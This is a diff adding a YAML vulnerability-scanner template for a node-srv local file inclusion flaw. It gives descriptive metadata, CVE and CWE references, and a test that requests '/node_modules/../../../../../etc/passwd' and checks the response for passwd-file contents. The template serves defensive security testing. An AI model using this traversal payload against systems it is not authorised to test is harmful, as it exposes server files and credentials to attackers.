@@ -1,0 +1,61 @@
+id: NODE_SRV_LFI
+info:
+  name: "node-srv Local File Inclusion"
+  description: "node-srv Local File Inclusion (LFI) is a security vulnerability found in applications utilizing the node-srv package, where user input for file paths is not properly validated. If an attacker can manipulate input to include local files from the server's filesystem, they may gain unauthorized access to sensitive data such as configuration files or environment variables. This vulnerability can lead to information disclosure, where critical system information is exposed, potentially allowing further exploitation or attack. Implementing strong input validation and sanitization measures is essential to mitigate the risk of LFI in node-srv applications."
+  details:  "Node-srv Local File Inclusion (LFI) occurs when an application using the node-srv package improperly handles user-supplied input for file paths. Attackers can exploit this vulnerability by crafting requests that include malicious or unintended file paths, allowing them to access sensitive files on the server, such as logs, configuration files, or other critical data. This unauthorized access can lead to significant security risks, including information disclosure and further exploitation of the application or server. To mitigate LFI risks, developers should implement rigorous input validation and enforce strict whitelisting of acceptable file paths within the node-srv application."
+  impact: "The impact of node-srv Local File Inclusion (LFI) can be severe, as it allows attackers to access sensitive files on the server, leading to information disclosure and potential system compromise. By exposing critical data such as configuration files, database credentials, or application logs, attackers can leverage this information to escalate privileges, launch further attacks, or gain unauthorized access to other systems. This breach not only poses risks to data integrity and confidentiality but can also result in reputational damage, financial losses, and regulatory penalties for the organization. Additionally, the exploitation of LFI vulnerabilities may serve as a gateway for more complex attacks, increasing the overall security risk to the application."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: NODE_SRV_LFI
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2021-39433
+    - CVE-2023-22973
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+  url:
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: "host"
+      value:
+        extract: hostHeaderVal
+wordLists:
+  paths:
+    - '/node_modules/../../../../../etc/passwd'
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_url: "${paths}"
+      - modify_method: GET
+      - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    regex: "root:.*:0:0:"
